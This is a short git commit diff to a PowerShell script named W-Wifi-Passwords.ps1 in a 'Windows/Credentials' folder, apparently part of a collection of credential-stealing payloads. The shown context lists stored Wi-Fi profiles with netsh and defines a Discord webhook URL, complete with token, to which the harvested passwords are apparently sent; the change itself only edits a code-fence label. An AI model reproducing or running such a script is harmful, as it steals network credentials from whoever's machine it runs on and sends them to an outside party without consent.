50ea79c9c84d44808f3b9b563274401fc2fbdfd4
Isaac Sanz <isaacsanzgomez102125@gmail.com>
2023-10-22 23:10:01 +0200

    Update

--- Windows/Credentials/WWifiPasswords/W-Wifi-Passwords.ps1
+++ Windows/Credentials/WWifiPasswords/W-Wifi-Passwords.ps1
@@ -3,7 +3,7 @@ $wifiProfiles = netsh wlan show profiles | Select-Object
 
 # Define the webhook URL
 $webhook_url = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
-$content = '```'
+$content = '```ml'
 
 $wifiProfiles | ForEach-Object {
     $profileName = $_ | Select-String 'Perfil de todos los usuarios\s+:\s(.+)' | ForEach-Object {
